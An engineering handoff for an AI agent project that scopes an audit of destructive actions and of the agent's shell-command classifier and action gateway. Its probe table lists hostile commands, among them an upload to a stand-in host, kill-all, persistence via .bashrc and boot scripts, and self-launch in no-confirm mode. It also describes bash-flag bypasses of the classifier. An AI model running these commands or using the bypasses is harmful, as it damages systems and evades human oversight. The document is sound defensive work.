# WP2.1 group 15 scope — final census and adversarial verification

Architect handoff, 2026-10-22, written against committed HEAD `941ec3f`
("fix: require absolute lifecycle paths"). This document owns no finding IDs
and no completion status; `CODEY_OS_MASTER_BLUEPRINT.md` (WP2.1 entry) and
`NEW_ISSUES.md` stay authoritative. Provisional labels `G15-F#` are for the
coordinator to turn into `NEW-1006+` (last allocated ID seen: `NEW-1005`). No
source, test or tracking document was edited. Group 15 is **not started**.
WP2.1 is **OPEN**.

## 0. Method, provenance and limits

**Excluded foreign edits.** At scoping time the working tree held someone
else's uncommitted, in-progress edits. They are excluded from every statement
below; none were read as evidence of committed behavior, none were modified:

- `core/process_boundary.py` (5 lines changed per `git diff --stat`)
- `tools/shell_tools.py` (159 lines changed per `git diff --stat`)
- `tests/test_execution_recovery_gateway.py`
- `tests/test_shell_refusal_accounting.py`
- `tests/test_shell_wrapper_boundaries.py`
- the tracked-modified and many untracked files under `.claude/` (agent
  definitions and agent-memory notes)

All source facts below come from `git show HEAD:path` or from a `git archive
HEAD` snapshot extracted to `/data/data/com.termux/files/usr/tmp/g15scope/head`.
**Coordination consequence (important):** the foreign `tools/shell_tools.py` +
`tests/test_shell_wrapper_boundaries.py` change is in exactly the area slice
G15c (shell classifier) would edit (wrapper basenames, `-c` handling). The
classifier probe results in section 2.7 are **HEAD-only** and may already be
partly superseded by that in-progress work; re-run the matrix against whatever
the owner commits. G15c cannot start until the coordinator knows who owns that
diff (finish-and-commit, or discard). G15a does not touch any of these files.

**Probes run (all offline; no model, no network, no signals sent, no kill):**
the three scripts that could touch Codey code or state (the sizing AST scanner
`probe_census2.py`, and the classifier probes `cls_probe.py`, `cls_probe2.py`,
`cls_probe3.py`) ran with `python3 -I`, disposable
`HOME=.../g15scope/home`, `CODEY_STATE_DIR=.../g15scope/state`,
`CODEY_ACTION_GATEWAY_AUDIT=.../g15scope/state/audit.jsonl`, and proxy
variables unset. **Disclosed deviation from the full-isolation instruction:**
several stdlib-only text-processing helpers ran with partial or no environment
setup: `agg.py` and one inline row-listing script (no env vars), `ledger.py` and
`tail.py` (`HOME` only, with `-I`), and two inline one-shot editors (the sizing
patcher and the final doc edits, run from the repo cwd without `-I` or the env
vars). None imported or executed any Codey module, wrote anywhere except the
scratch directory or this spec file, or touched a state directory; the only run
that imported Codey code (`tools.shell_tools`) had the full env. Scratch artifacts (not repo files): `probe_census2.py`
(sizing AST scanner, parse-only, never imports scanned code), `census_all.tsv`,
`cls_probe*.py` (import `tools.shell_tools` from the HEAD
snapshot and calls `classify_shell_command` only), `ledger.py` / `tail.py`
(read-only ledger readers).

**Observed NEW-855 live (verbatim):** after importing `tools.shell_tools` once
under the disposable `CODEY_STATE_DIR`, `ls $CODEY_STATE_DIR` printed
`checkpoints` and `state.db`, i.e. a plain import creates the state DB and
checkpoint schema. The scanner probe (parse-only, no imports) created nothing.
Consequence for the design below: the census tool must never import scanned
code, and every verifier script must set the three environment variables
before any import.

**NOT verified (rule 12, do not cite):** reachability of any individual
candidate row; whether `flake8`/`mypy` config execution is real (uninstalled
here); whether `/proc/net/tcp` is readable on this device; which cwd the daemon
runs in; hardlink creation (unavailable on this device per NEW-872);
anything in the sibling repos (Codey-Aigentik, Private-Codey-Agent,
`~/restoricon`) beyond what groups 7/8 already recorded.

## 1. What WP2.1's definition of done actually is

The blueprint WP2.1 entry (`CODEY_OS_MASTER_BLUEPRINT.md`) states:

- *Objective* (line ~3404): "one chokepoint for every irreversible action
  (§16.1)."
- *Intent* (lines ~3433-3436): "shell exec, file write/patch/delete, git
  writes, outbound HTTP, DB writes, message/email sends, device actions — all
  pass one audited, policy-checked boundary. Capability manifest `permissions`
  / `resource_limits` become **enforced**, not metadata."
- *DoD* (lines ~4278-4279): "**no destructive call site bypasses the gateway;
  the §16.1 three-surface split is gone.** Not yet met — slices 1-32 cover 4 of
  42 known write-primitive files [...]; the four-of-42 write-primitive count
  does not measure Git subprocess coverage."
- Closure requirements carried by the 2026-10-09 remaining-scope census
  (`docs/census-2026-10-09/WP2.1_remaining_scope.md`, "Closure requirements"):
  "Every real destructive/action boundary needs an enforced authority decision
  and truthful audit. Map candidates to actual callers and dispositions with
  evidence; retain uncertain reachability as open. Close direct and generated
  bypasses, callback-free HIGH_IMPACT authorization, refusal/error accounting,
  imports, manifest permissions/resource limits and external data egress.
  [...] Do not mark closure on candidate counts, mocked dispatch alone, or
  silent policy exceptions. RBAC credentials are not human confirmation."
- Blueprint status line (2026-10-18, later): "WP2.1 remains OPEN until that
  census reconciles groups 13/14 residuals and the full definition of done."

**Two honest problems with the DoD as written** (these are forks for Ish, see
section 7; the architect does not resolve them):

1. *"the §16.1 three-surface split is gone"* conflicts with a decision Ish
   already approved in group 7: `restoricon_core` has its own native
   fail-closed authority mechanism (`restoricon_core/authority.py`,
   `BUSINESS_MUTATION_AUTHORITY`), deliberately **not** importing
   `core.action_gateway`; CCOS dispatch uses its own `CAPABILITY_AUTHORITY`
   table (`ccos/core/plugin_manager.py`) that routes into `gate_exec`. So there
   are still at least two authority mechanisms by design. Closure as literally
   worded is impossible; it has to be restated (proposed wording in section 7).
2. *"no destructive call site bypasses the gateway"* cannot be true for the
   shell tool: `classify_shell_command` returns `ACT` for destructive commands
   (section 2.7), and ACT runs unconfirmed under `--yolo`/one-shot/bench. Even a
   perfect classifier is an opaque-interpreter problem (NEW-904). Whether
   "audited at ACT" counts as "not bypassing" is the single decision that
   determines whether WP2.1 can close at all.

Definition-of-done checklist: section 6.

## 2. Census method (mechanical, re-runnable)

### 2.1 Why the 2026-10-09 census cannot be trusted as the register

`docs/census-2026-10-09/` retained 1,384 candidate rows in 122 files out of 201
Python files, and states itself that it retained no scanner, no source hashes,
no HEAD, excluded `bench/`, `telemetry/`, `codey_estimator/`, all shell, JS and
manifests, and dispositioned nothing. Its line numbers have drifted through 60+
commits. It is useful only as a historical cross-check. The group 14 and
group 12 documents hold the only dispositions with evidence; the final census
must produce one register that supersedes all of them.

### 2.2 Sizing probe against the HEAD snapshot (verbatim counts)

`git archive HEAD` snapshot: 627 `*.py` files (all dirs, excluding `.claude/`),
zero parse failures; **703 candidate rows in 114 production files** after
excluding `tests/`, `test_*`, `test.py`, `demo_*`, `conftest.py` (the full scan
including tests produced 2,591 rows). Candidates by category (production only):

```
sqlite_write 321   fs_write 244   network 55   exec_spawn 43
sqlite_conn 14   sqlite_exec 9   kill 9   dyn_code 5   env_mut 3
```

By directory (production rows): core 290, restoricon_core 223 (210 of them
SQL-literal writes), ccos 103, telemetry 25, pipeline 22, tools 18, bench 13,
root 5, utils 4. **Only 22 of the 703 rows were recognizable as lexically
enclosed in a `gate_*` thunk** (rows inside a function whose name is passed to
a gate call, same file). That heuristic cannot decide mediation (callers pass
thunks across modules, delegate to `Filesystem.write`, `_run_shell_command_structured`,
`run_git`, `OwnedLaunch.run`), so the tool must **diff and require a recorded
disposition, not judge**. 703 is a candidate count, not a bypass count (the
10-09 census made the same point).

Non-Python surface (14 shell scripts, line counts from `git show`): `install.sh`
687 lines (87 effect-bearing lines by a crude regex), `lib/service_lifecycle.sh`
254 (26), `tools/setup_skills.sh` 222 (13), `lib/service_manager.sh` 72,
`setup.sh` 47, `setup_repo.sh` 34, `lib/bootstrap_environment.sh`, launchers
`codey`, `codey-start`, `codey-stop`, `codey-metrics`, `codeyOS`, `codeydOS`
(17-78 lines each, mostly delegation after 13d/13c.2b.3), plus
`.github/workflows/tests.yml`. Plugin `manifest.json` files under
`ccos/plugins/**` carry executable pointers (`implementation`, `command`) and
the `permissions` fields; Codey-Aigentik (JS) and Private-Codey-Agent
(Dart/Kotlin) are sibling repos.

### 2.3 Tool design (design only, nothing written)

- **Script:** `tools/wp21_census.py` (under `tools/`, **not** `bench/`: `bench/`
  is the rule-1 evaluator tree and `bench/**` is HIGH-classified; a census tool
  living there would be self-protecting the wrong thing).
- **Never imports scanned code** (NEW-855: import creates state). Parse with
  `ast` only; shell/manifest scanning is text-only.
- **Source of truth for scanning:** `git archive <rev>` into a temp dir (default
  `HEAD`), so dirty working-tree edits by other agents cannot leak in. It
  records in `run_meta.json`: `git rev-parse <rev>`, `git status --porcelain`
  dirty-path list, sha256 of every scanned file, the pattern-set hash, Python
  version, and tool version. (The 10-09 census lacked all of this.)
- **Row key (drift-proof):** `file::qualname::callee::ordinal`, where qualname
  is the dotted enclosing def/class chain including `<locals>` closures and
  `ordinal` is the n-th occurrence of that callee inside that qualname.
  **Never line numbers** (they are reported but are not part of the key).
- **Outputs**, committed under `docs/wp21_census/<rev8>/`: `scan.tsv` (rows),
  `shell_scan.tsv`, `manifest_scan.tsv`, `env_names.tsv`, `run_meta.json`,
  `report.md`; plus the living register `docs/wp21_census/dispositions.tsv`.
- **Key granularity (churn control):** per-row ordinals churn when one early
  `execute()` is added to a method (every later ordinal shifts, producing mass
  stale-plus-new rows). Dispositions may therefore be recorded at
  **qualname granularity with an expected callee count** for `NATIVE_AUTHORITY`
  and `BOOKKEEPING` rows (e.g. `restoricon_core/services/crm_service.py::
  CRMService.update_lead` with `sql_write: 3`); the test then fails only if the
  count changes, not on reshuffling. `GATED`/`UNMEDIATED` rows stay per-row.
- **Dispositions file columns:** `key, class, mediator, evidence, reach,
  severity, finding, decided_by, reviewed_by, first_seen_rev`.
  `mediator` names the gate wrapper or authority table; `evidence` is
  `file:line` plus a test name; `reach` is one of
  `prod-confirmless | prod-interactive | operator-only | dormant | test-only |
  sibling`.
- **Coverage test:** `tests/test_wp21_census_coverage.py` runs the scanner on
  the *working tree it is in* (this is the commit-time gate) **but attributes
  every row to its path's git status and reports rows from dirty paths as a
  separate "foreign/dirty" group that warns instead of failing**, so another
  agent's in-progress edits (as in section 0) cannot break an unrelated
  author's test run in this shared tree. It fails if (a) any scan row lacks a disposition row ("new unreviewed boundary"),
  (b) any disposition row has no scan row (stale), (c) a `UNMEDIATED` row has no
  finding ID or severity, (d) a `GATED` row's `mediator` is not an AST-reachable
  gate call per the helper rule below, (e) any `UNKNOWN` remains. **Cross-track
  boundary (stated explicitly, a friction point for Ish/the coordinator):**
  `restoricon_core/` is Track B code that Track A's census scans; the coverage
  test gates `restoricon_core` rows only at the *qualname/count* level against
  `restoricon_core/authority.py`, and the existing
  `tests/test_business_mutation_authority_coverage.py` remains the real gate for
  its authority mapping. A Track B developer adding a SQL write must update the
  census count or the register, otherwise Track A's test starts failing for
  them; if Ish prefers, `restoricon_core` rows can be scan-reported but left
  ungated by this test (then the DoD checklist below states that the
  business-layer boundary is covered by its own test only). This copies
  the NEW-910 AST-coverage precedent
  (`tests/test_ccos_capability_authority_coverage.py`) and the lesson of NEW-750
  / NEW-923 (hand-typed lists drift; the AST scanner of
  `test_business_mutation_authority_coverage.py` only sees direct bare-Name
  `has_permission` calls).
- **Mediated-helper rule** (per-helper, evidence-recorded, not per-row): a
  helper such as `Filesystem.write`, `_run_shell_command_structured`,
  `core/git_execution.py::run_git`, `core/process_identity.py::OwnedLaunch.run`,
  `persist_coalesced` is "mediated iff every production caller reaches it via a
  gate call". The tool computes the reverse call graph over `ast` (names and
  attribute names, conservative: unresolved attribute calls count as callers),
  and a helper's disposition row lists the callers it relied on. An unresolved
  or dynamic caller makes the helper `UNKNOWN`, not `GATED`.
- **Gate vocabulary** recognized as mediators: `gate_exec`, `gate_write`,
  `gate_append`, `gate_read`, `refuse_exec`, `persist_coalesced`,
  `_authority_for`/`call_capability` (CCOS), `BUSINESS_MUTATION_AUTHORITY`
  methods (restoricon).
- **Dynamic SQL:** a non-constant first argument to `execute`/`executemany` is
  emitted as `sql_dynamic` (never dropped); constant SQL is classified by the
  leading verb (`INSERT|UPDATE|DELETE|CREATE|DROP|ALTER|REPLACE|PRAGMA x=|VACUUM|
  ATTACH`).
- **Runnable scripts are not excluded:** plugin `test.py`, `demo_*.py`,
  `tools/*.py` CLIs are scanned and classed `operator-only`/`test-only`, never
  silently dropped (NEW-798: demo scripts could repopulate quarantined files;
  NEW-988: plugin `test.py` is a runnable script). Only `tests/**` and
  `conftest.py` are skipped, and that exclusion is itself listed in the report.
- **Scope statement in every report:** each top-level directory is either in
  scan scope or excluded with a one-line reason (`telemetry/`, `codey_estimator/`,
  `restoricon_core/`, `pipeline/`, `bench/` are all **in** scope; sibling repos
  excluded). Absence from the scan is never an exemption.

### 2.4 Pattern set (concrete, re-derive and extend; reconcile with the probe)

Python AST callee patterns (resolve `import x as y` and `from x import y as z`
aliases; also flag non-constant `getattr(os|subprocess|shutil|socket, ...)`):

| Category | Patterns |
| --- | --- |
| `fs_write` | builtin/`io.open`/`codecs.open`/`Path.open`/`os.fdopen` with a mode containing `w a x +`, or non-constant mode (`mode=<dynamic>`); `os.open` (any flags); `.write_text` `.write_bytes` `.writelines` `.touch` `.mkdir` `.unlink` `.rmdir` `.rename` `.replace`-on-Path `.symlink_to` `.hardlink_to` `.chmod` `.truncate`; `os.remove/unlink/rename/renames/replace/rmdir/removedirs/makedirs/mkdir/chmod/chown/link/symlink/truncate/ftruncate/utime/mkfifo/write`; `shutil.copy/copy2/copyfile/copytree/move/rmtree/make_archive/unpack_archive/copymode`; `tempfile.mkstemp/mkdtemp/NamedTemporaryFile/TemporaryDirectory` (persistence via `delete=False`); `zipfile.ZipFile`/`tarfile.open` write modes; `shelve.open`, `dbm.open`, `pickle.dump`, `logging.FileHandler`, `sqlite3.connect` (creates the file) |
| `exec_spawn` | `subprocess.run/Popen/call/check_call/check_output/getoutput`, `os.system/popen/exec*/spawn*/fork/forkpty`, `pty.spawn`, `asyncio.create_subprocess_*`, `multiprocessing.Process`, `concurrent.futures.ProcessPoolExecutor` |
| `kill` | `os.kill/killpg`, `signal.pthread_kill/raise_signal`, `psutil.Process(...).kill/terminate/send_signal` |
| `network` | `socket.*` (listeners = inbound boundary too), `ssl`, `urllib.request.urlopen/Request/build_opener`, `http.client.*`, `requests`, `httpx`, `aiohttp`, `websockets`, `smtplib`, `ftplib`, `uvicorn.run`, `http.server`, `socketserver`, `google.cloud.*` |
| `dyn_code` | `exec`, `eval`, `compile`, `__import__`, `importlib.import_module/util.spec_from_file_location/module_from_spec`, `runpy.*`, `pickle.load(s)`, `marshal.load(s)`, `yaml.load`, `ctypes.*`; plus any file the plugin loader or `skill_recombiner` loads and executes |
| `env_mut` | `os.environ[...] =`, `os.environ.update/setdefault/pop`, `os.putenv/unsetenv`, `os.chdir`, `os.umask`, `sys.path` mutation |
| `credential` | `keyring.*`, `getpass.getpass`, env reads whose name matches `(?i)(key|token|secret|passw|credential|auth)`, string constants naming `.ssh`, `.netrc`, `gcloud`, `credentials`, `.env`, `id_rsa`, `.gnupg`, `openssl`/`gpg`/`age` in subprocess argv (`utils/config.py:687`, `core/backup_*.py`, `core/setup_dr_key.py` seeds) |
| `sqlite_write` / `sql_dynamic` | see 2.3 |

Shell/launcher text scan (`install.sh`, `setup*.sh`, `tools/setup_skills.sh`,
`lib/*.sh`, the six launchers): `rm mv cp ln chmod chown mkdir tee dd`, `sed -i`,
redirections `>`/`>>`, `kill pkill killall`, `curl wget scp rsync ssh gh git
push|commit|clone|reset|clean`, `pip|pkg|apt|npm install`, `nohup setsid`,
`eval source exec`, `python3 -c`, `termux-*`, `sqlite3 litestream cloudflared
llama-server`, `crontab`, writes under `~/.bashrc ~/.termux/boot`.

JSON manifest scan: every `ccos/plugins/**/manifest.json` and
`ccos/data/capabilities.json` (executable pointers `implementation`/`command`,
`permissions`, `resource_limits`) cross-checked against `CAPABILITY_AUTHORITY`
and NEW-750's naming-mismatch class.

**Environment-variable census** (new; none of the prior censuses has it):
enumerate every `os.environ[...]`/`os.environ.get`/`os.getenv` name in
production code and class it as *executable-selector* (`CODEY_LLAMA_SERVER`,
`CODEY_LLAMA_LIB`, `CODEY_LINTER`), *authority-modifier* (`ALLOW_SELF_MOD`,
`CODEY_SELF_IMPROVE`, `CODEY_TRAJECTORY`), *path-redirect* (`CODEY_STATE_DIR`,
`CODEY_ACTION_GATEWAY_AUDIT`, `CODEY_CONFIG_PATH`, `RESTORICON_DB_PATH`),
*credential* or *mode toggle*. Seen at HEAD with a quick grep:
`CODEY_STATE_DIR`, `CODEY_ACTION_GATEWAY_AUDIT`, `CODEY_BACKEND(_P)`,
`CODEY_LLAMA_SERVER`, `CODEY_LLAMA_LIB`, `CODEY_LINTER`, `CODEY_CONFIG_PATH`,
`CODEY_TRAJECTORY(_DB|_TAG)`, `CODEY_SELF_IMPROVE`, `CODEY_RECURSIVE`,
`CODEY_TELEMETRY`, `CODEY_PRIMARY_PORT`, `CODEY_EMBED_PORT`, `CODEY_LLAMA_PORT`,
`CODEY_N_CTX`, `CODEY_USE_FIX_MEMORY`, `CODEY_CRM_TOOL_ENABLED`. Also enumerate
CLI mode flags from **both** `add_argument` and the hand-parsed ones
(`--allow-self-mod`, `--finetune`, `--lora-force-adopt`, `--import-lora`,
`--fix`, `--tdd`, `--init`, `--daemon`, `--yolo`, `--read`, `--plan`).

### 2.5 Disposition taxonomy (expanded beyond the four classes in the request)

| Class | Meaning and required evidence |
| --- | --- |
| `GATED` | On a gate path (direct, or via a helper meeting the helper rule). Evidence: mediator qualname + test name. |
| `NATIVE_AUTHORITY` | Mediated by a separate Ish-approved mechanism: `BUSINESS_MUTATION_AUTHORITY` (restoricon service layer, group 7) or `CAPABILITY_AUTHORITY` (CCOS, group 4). Evidence: table entry + the coverage test, and its known limits (NEW-923 bare-Name only; NEW-913 non-literal names). |
| `BOOKKEEPING` | Fixed-purpose recording, cited row of `docs/wp2_1_group12_persistence_contract.md` (audit sink, state schema, episodic append, resource flock/lease, telemetry, trajectory hooks, pipeline ingestion). No module-wide exemption: arbitrary-path/SQL APIs are not covered. |
| `OPERATOR_BOOTSTRAP` | Operator-run installer/setup/credential script with an explicit written disposition naming the operator act, why it cannot import the gateway (pre-dependency), whether the shell tool can invoke it (then it is also in the shell residual), and any fork decision. |
| `LOOPBACK_IPC` | Loopback-only HTTP/socket per group 9's formal exclusion record; the URL source must be a constant or validated loopback; no egress. |
| `READ_NOEFFECT` | Side-effect-free read/probe (`getprop`, `git rev-parse` via an isolated READ context, `ps`); reason required. Reads that carry credentials or egress are not this class. |
| `DORMANT` | No production caller. Evidence: reverse-call-graph result (zero callers outside `tests/`) at the scan revision, re-derived by the tool each run. Never an exemption for a future caller. |
| `OPERATOR_SCRIPT_RUNNABLE` | `tools/*.py`, plugin `test.py`, `demo_*.py`: runnable by the operator or by the agent's shell tool (ACT); lists which. |
| `EXCLUDED_SIBLING` | In another repo; cited exclusion. |
| `FALSE_POSITIVE` | e.g. `str.replace`; one-line reason. |
| `UNMEDIATED` | Open finding. Must carry a `NEW-###`, severity per the rubric below, and `reach`. |
| `UNKNOWN` | Initial state of every new row. Must be zero at closure. |

### 2.6 Severity rubric (so "fix only High" is bounded)

Ish said on 2026-10-18 to report everything and fix only High. Proposed
definition (to be ratified by Ish, section 7 item F4):

**HIGH** = reachable from a production caller in a **confirm-less mode**
(`--yolo`, daemon/`TaskExecutor`, `--fix`/`--tdd`, one-shot, the bench harness
(`bench/agents.py:31` launches `main.py <task> --yolo --no-resume`), a CCOS
executor, a scheduled/Termux-boot trigger) **and** the effect is one of: kill
of a non-owned process, exfiltration/egress of local data, credential read/mint/
use, publishing (git push, public repo, message/email to a third party),
irreversible delete or overwrite, or a write to the agent itself / the
evaluator / the authority configuration (`core/`, `tools/`, `ccos/plugins`,
`bench/**`, `main.py`, launchers, `lib/`, `install.sh`, `.git/hooks`).
**MEDIUM** = reachable in a confirm-less mode but reversible / local-only, or
a High-class effect only reachable interactively with a human present.
**LOW** = fidelity, audit-completeness, docs, test hygiene, dormant. Anything
ambiguous is rated at the higher class and listed for Ish. Only HIGH
`UNMEDIATED` rows are fixed in group 15; everything else is reported and queued.

### 2.7 Seed findings from the HEAD probes (candidates, not yet adjudicated)

`classify_shell_command` at HEAD (`git archive HEAD`, imports only the
classifier), verbatim results. Format `CLASS | command`:

```
ACT | killall llama-server          ACT | kill -9 -1
ACT | pkill -f llama-server         ACT | pkill -f x
ACT | bash -lc 'curl -d @f https://x'   ACT | bash  -c 'curl x'     (double space)
ACT | bash -lc 'git push'           HIGH_IMPACT | bash -c 'git push'  HIGH_IMPACT | /bin/bash -c 'curl x'
ACT | gh repo create x --public     ACT | crontab -e   ACT | su -c id   ACT | at now
ACT | cp x /data/data/com.termux/files/home/.termux/boot/s.sh
ACT | tee -a /data/data/com.termux/files/home/.bashrc     ACT | mv x .../home/.bashrc
ACT | sed -i s/a/b/ /data/data/com.termux/files/home/.bashrc   ACT | rm /data/data/com.termux/files/home/.bashrc
ACT | bash -lc 'echo x >> ~/.bashrc'   ACT | bash  -c 'echo x >> ~/.bashrc'   ACT | bash -lc 'pkill -f llama-server'
HIGH_IMPACT | env bash -lc 'pkill x'   HIGH_IMPACT | sh -c 'echo x >> ~/.bashrc'
ACT | sed -i 's/a/b/' bench/suite.lock   ACT | python3 bench/lock.py
ACT | python3 main.py --yolo        ACT | codeyOS --yolo --allow-self-mod
ACT | ln -sf /etc/passwd x          ACT | sqlite3 db 'delete from t'
ACT | python3 -c "open('x','w').write('1')"   ACT | node -e 1   ACT | perl -e 1
ACT | pip install x   ACT | pip uninstall -y x   ACT | npm install x   ACT | dd of=x   ACT | shred f
ACT | python3 f.py    ACT | pytest -p evil    ACT | openssl enc -d -in f    ACT | gpg -d f
HIGH_IMPACT | rm -rf d   HIGH_IMPACT | curl https://x   HIGH_IMPACT | wget https://x
HIGH_IMPACT | termux-sms-send ...   HIGH_IMPACT | git status   HIGH_IMPACT | env FOO=1 true   HIGH_IMPACT | sudo id
```

Reading (each is a *candidate*, to be adjudicated in G15b): (a) kill/pkill/
killall at ACT is the project's own rule-3 incident class (the agent could run
`pkill -f llama-server` unconfirmed under `--yolo`); (b) `bash -lc`/`bash  -c`
combined/spaced flags bypass the substring match even for `git push` and
`curl`: NEW-933 is **still live at HEAD** (verbatim above; group 9 logged it
as not fixed); (c) `gh repo create --public` is publishing at ACT; (d) with **absolute** paths, `cp`/`mv`/`tee`/`sed -i`/`rm` against `$HOME/.bashrc`
and `$HOME/.termux/boot/` classify ACT (verbatim above), i.e. persistence and
deletion outside the workspace at ACT, which the dedicated `write_file`
containment (`Filesystem`) does not cover because it is the shell tool;
`crontab` is the same class. *Correction of an earlier misreading:* the
tilde and redirection forms (`echo x >> ~/.bashrc`, `tee -a ~/.bashrc`,
`cp x ~/.termux/boot/...`) are **not** shown as effects, because `shell()` uses
`shlex.split` with no `shell=True`; I read `_run_shell_command_structured`
(`tools/shell_tools.py` at HEAD) and found no `expanduser`, `expandvars` or glob
anywhere in `tools/shell_tools.py`, so `~` and `>>` arrive as literal arguments
(a literal `./~/.bashrc` path, or `echo` printing `>>`). The same tilde and
redirection forms **do** get real shell semantics through the NEW-933 escape
(`bash -lc 'echo x >> ~/.bashrc'` classifies ACT, row above); `exec rm a`
(a shell builtin) and `ls; rm a` (`;` literal) are not claimed as risks; (e) the agent launching `python3 main.py --yolo` or
`codeyOS --yolo --allow-self-mod` at ACT is a confirm-less self-launch;
(f) `sed -i`/`python3` over `bench/suite.lock` and bench files at ACT: the
evaluator's tamper-evidence (`bench/lock.py`, `suite.lock`) is the only
defense and **has not been verified to detect a shell-ACT edit** (suspected
only); (g) no daemon impact verified: `_daemon_shell` (`core/task_executor.py:481`)
is a prefix allowlist (`"ls" "cat" "echo" "grep" "find" "env" "which" "pwd"
"pytest" "git status|log|diff|show" "cd " "printenv"`) using `cmd.startswith`
with **no word boundary**, so any binary merely beginning with an allowed
prefix is admitted (`lsof`, `lsblk`, `catman`, `envsubst`, ...); the shell tool
itself uses `shlex.split` and no `shell=True`, so `;`, `&&`, `$()`, `~`, `>`
are literal arguments unless an interpreter such as `bash -c` is invoked
(the classifier's ACT result for `ls; rm a` is therefore not a bypass by
itself). `python3 script.py` and `pytest`
are allowed in the daemon and run agent-written code: the opaque-interpreter
ceiling (NEW-904).

Other first-look candidates from the scan (to disposition, not asserted as
bypasses): `utils/config.py:687` credential decrypt subprocess;
`core/search.py:55` `subprocess.run` (NEW-878 fixed the dedicated tool, this
helper is unclassified); `core/peer_shell.py:262,319,375,524` Popen/run (covered
by the 971 gate, verify every caller); `core/lora_import.py:350,368`
`_merge_with_shell` (14e, verify); `core/embed_server.py:242`, `:305`
(14d/13f; NEW-983); `ccos/core/sandbox.py:235` (dormant); `bench/agents.py:31`,
`bench/verify.py:36` (measurement harness; the bench agent runs `--yolo`);
`core/inference_openrouter.py:104-156`, `core/plannd.py:671-947`
(config-selected remote backends: whole prompts leave the device when
`CODEY_BACKEND`/`CODEY_BACKEND_P` select remote; groups 9/WP0.x recorded
dispositions, re-verify); `restoricon_core/api/routes.py:492`
(`_call_budget_gated_completion`, outbound HTTP);
`restoricon_core/services/notification_service.py:71` (group 8);
`ccos/plugins/device/termux_api/*` (group 6); `core/daemon.py:1788`
`os.kill` of TUI PIDs (13c identity, verify). The 9 `kill` rows are all in lifecycle/resource modules
(`core/daemon.py`, `core/embed_server.py`, `core/loader_v2.py`,
`core/process_identity.py`, `core/resource_bus.py`, `core/resource_gate.py`).
Read at HEAD: six are `os.kill(pid, 0)` liveness probes
(`resource_bus.py:248`, `resource_gate.py:3143,3281`, `daemon.py:1788`,
`embed_server.py:444`); the real signal senders are
`process_identity.py:352` (`LifecycleRecord.signal`), `loader_v2.py:317`
(`_kill_single_pid_term_then_kill`) and the two `os.killpg` owned-child paths
(`embed_server.py:305`, `loader_v2.py:950`). The census should classify liveness
probes `READ_NOEFFECT` and require each real sender to cite its identity-
validation helper (rule-4-reviewed in groups 13/14, not re-verified here).

### 2.8 Dynamic complement (second mechanical channel)

Static scanning misses `getattr` indirection, `exec`'d code and plugin loads.
Add `tools/wp21_audit_trace.py`, a pytest plugin (opt-in `-p`) using
`sys.addaudithook` for `open` (with mode), `os.remove/rename/mkdir/rmdir`,
`shutil.*`, `subprocess.Popen`, `os.exec`, `os.system`, `os.kill`,
`socket.connect/bind`, `sqlite3.connect`, `exec`, `compile`, `import`. It wraps
`ActionGateway.gate_*`/`refuse_exec` at runtime (monkeypatch inside the plugin,
no source edit) to maintain a `ContextVar` gate-depth, and records for each
event `(event, target-class, innermost non-stdlib frame as file::qualname,
in_gate)`. Cross-check rule: every event's `file::qualname` must exist in the
static register; an event with no static row means the scanner is missing a
pattern (add it). Honest limits: it only sees tested paths; mocks hide effects;
it is evidence for pattern completeness, never proof of mediation. Run on
bounded test chunks only (NEW-791/NEW-906/NEW-886: the full suite hangs or
SIGABRTs on this device; do not claim a full-suite pass), with disposable env.
No model load; existing fixtures already guard process kills (NEW-957).

## 3. Reconciliation of WP2.1-range findings

Scope rule: only `NEW-###` tagged WP2.1 (or whose latest update names WP2.1 /
groups 1-15) are reconciled. Ledger status is free text: nearly every entry
contains both "fixed" and "open" words, so **status below was read from each
entry's latest Update/resolution, not its header** (a regex status column was
tried and is noise; the ledger has no machine-readable status, recorded as
G15-F11). Buckets: **B** blocks the DoD / must be verified-or-fixed or
explicitly accepted by Ish; **F** fidelity residual, non-blocking; **T** test
hygiene; **I** Ish decision; **X** excluded (other track / other WP).

### 3.1 Retained cases named in the task

| Finding | Current status (latest update) | Group 15 does | Blocks WP2.1 closure? |
| --- | --- | --- | --- |
| NEW-939 | Open. Six writers closed (`96ad7f4` 14g, `3981457` 14i); finetune plugin writers un-enveloped (NEW-992); "KB/export/model artifacts, design notes" named candidates | **Verify** via census: disposition every writer in `tools/kb_*`, `pipeline/export`, `core/finetune_prep.py`, `core/embeddings.py` cache, model artifacts; close or relabel | Yes (closure requires census rows, not memory) |
| NEW-904 | Open, structural: exec-wrapper enumeration cannot be exhaustive | **Defer-with-decision**: Ish fork F2. G15c closes only *named* dangerous binaries (kill, pkill, killall, `gh repo create`, `crontab`, interpreter `-c`/`-e`/combined flags, `pip|npm|pkg install`) by group 6/9 precedent | Yes (needs Ish) |
| NEW-905 | Open: shell failures text-sniffed in episodic/display layer (known-gap test pins it) | **Defer** (fidelity, not authority) | No |
| NEW-913 | Suspected, dormant: non-literal `call_capability` names in `planner.py:399`/`lifecycle_manager.py:166`, outside the AST test | **Verify** still no production caller; keep dormant disposition with evidence | No while dormant |
| NEW-914 | Suspected: `gate_exec` writes `str(e)` into the audit `reason` for unexpected exceptions (customer text/URLs now flow via CCOS CRM/HTTP) | **Verify** exposure; recommend one central bounded-reason fix (small, security-sensitive, reviewer mandatory). Medium by rubric, so queued unless Ish says fix | No (queue) |
| NEW-943 | Ish decided: enable GCS object versioning; external GCP action, no repo code | **Defer**: not code; needs Ish to confirm closure may proceed with it open | No (ops) |
| NEW-944 | Ish decided: deleted documents' GCS copies should be removed; unscoped, no delete code exists | **Defer explicitly**; do not implement incidentally (would create a new HIGH_IMPACT delete boundary needing its own scope and review) | No (no call site exists) |
| NEW-951 | Partial: recursive classification within `core tools utils prompts ccos/plugins bench` done (14a/14a-ext) | **Verify** with a mechanical test that every `*.py` under the roots classifies HIGH; residual = NEW-975 item 3 | Via NEW-975 |
| NEW-972 | Open, explicitly DEFERRED by Ish 2026-10-18 (no production `wait=False` caller) | **Defer**; re-verify zero callers in the census | No, once Ish records "accepted callable debt" |
| NEW-975 | Partial: roots done; **launchers, `lib/`, `main.py`, `.codeyignore` not in roots** (ACT-writable); `--allow-self-mod` still a confirmation channel for HIGH writes (Ish 2026-10-08) | **Verify reach**; fork F3 | Yes (rubric: write-to-self) |
| NEW-983 | Open: no `gate_exec`/`refuse_exec` row for embed foreign kill; legacy servers refused; duplicated argv parser | **Verify** (adversarial: PID recycle, `/proc/net/tcp` unreadable); audit-row fix is lifecycle (rule 4) | Conditional: High only if identity check is bypassable |
